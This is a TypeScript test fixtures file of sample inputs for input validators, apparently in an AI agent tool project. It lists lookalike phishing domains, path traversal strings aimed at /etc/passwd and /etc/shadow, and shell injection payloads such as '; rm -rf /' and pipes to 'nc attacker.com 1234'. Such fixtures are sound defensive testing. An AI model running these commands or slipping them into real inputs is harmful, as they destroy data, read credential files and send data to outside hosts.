/**
 * Test fixtures and sample data
 */

export const sampleConfigs = {
  validProvider: {
    provider: 'openai',
    api_key: 'sk-test-key-12345',
    model: 'gpt-4',
    max_tokens: 4096,
  },
  invalidProvider: {
    provider: 'invalid-provider',
  },
};

export const sampleDomains = {
  valid: ['google.com', 'github.com', 'localhost', 'stackoverflow.com'],
  malicious: [
    'evil-github.com',
    'github.com.attacker.com',
    'notgithub.com',
    'github.com.evil.net',
    'fakegoogle.com',
    'google.com.phishing.io',
  ],
  subdomains: [
    'api.github.com',
    'docs.github.com',
    'mail.google.com',
    'www.stackoverflow.com',
  ],
};

export const traversalPaths = {
  dangerous: [
    '../../../etc/passwd',
    '../../../../etc/shadow',
    '/etc/passwd',
    '/../../../var/log/syslog',
    'foo/../../../../../../etc/hosts',
    '/home/../etc/passwd',
    String.raw`..\..\..\..\etc\passwd`,
  ],
  safe: [
    'src/index.ts',
    './tests/helpers/fixtures.ts',
    'package.json',
    'src/tools/browser/index.ts',
  ],
};

export const shellInjectionPayloads = [
  '; rm -rf /',
  '$(cat /etc/passwd)',
  '`whoami`',
  'foo && cat /etc/shadow',
  'bar | nc attacker.com 1234',
  'baz\nnewline-injection',
  'test; curl evil.com',
  'a$(id)',
  '${IFS}cat${IFS}/etc/passwd',
  'foo`id`bar',
  'test\\nid',
  'name; echo pwned > /tmp/pwned',
];

export const safeServiceNames = [
  'sshd',
  'nginx',
  'postgresql',
  'docker.service',
  'user@1000.service',
  'systemd-resolved',
  'NetworkManager',
];

export const maliciousServiceNames = [
  '',
  '; rm -rf /',
  'sshd$(whoami)',
  'nginx`id`',
  'a'.repeat(100),
  'sshd && cat /etc/shadow',
  'test | nc evil.com 1234',
  '1invalid',
];

export const validTimePeriods = [
  '1 hour ago',
  '30 minutes ago',
  '2 days ago',
  '1 week ago',
  '3 months ago',
  '10 seconds ago',
];

export const invalidTimePeriods = [
  'yesterday',
  'now',
  '1h ago',
  '$(date)',
  '; rm -rf /',
  '1 hour',
  'ago 1 hour',
  '1 lightyear ago',
];
